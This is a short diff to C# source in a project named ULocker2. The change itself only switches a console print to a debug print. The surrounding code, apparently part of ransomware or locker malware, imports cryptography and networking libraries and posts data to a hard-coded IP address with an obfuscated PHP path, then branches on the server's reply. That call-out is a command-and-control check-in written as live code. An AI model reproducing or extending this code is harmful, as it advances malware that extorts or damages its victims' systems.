@@ -10,6 +10,7 @@ using System.Windows.Forms;
 using System.Net;
 using System.IO;
 using System.Security.Cryptography;
+using System.Diagnostics;
 
 namespace ULocker2
 {
@@ -120,7 +121,7 @@ namespace ULocker2
 			// http://107.167.191.113/73dce75d92181ca956e737b3cb66db98.php
 			string recv = PostAndRecv(postData, "http://107.167.191.113/73dce75d92181ca956e737b3cb66db98.php");
 
-			Console.WriteLine("recv = " + recv);
+			Debug.WriteLine("recv = " + recv);
 
 			if (recv.Trim() == "1")
 			{
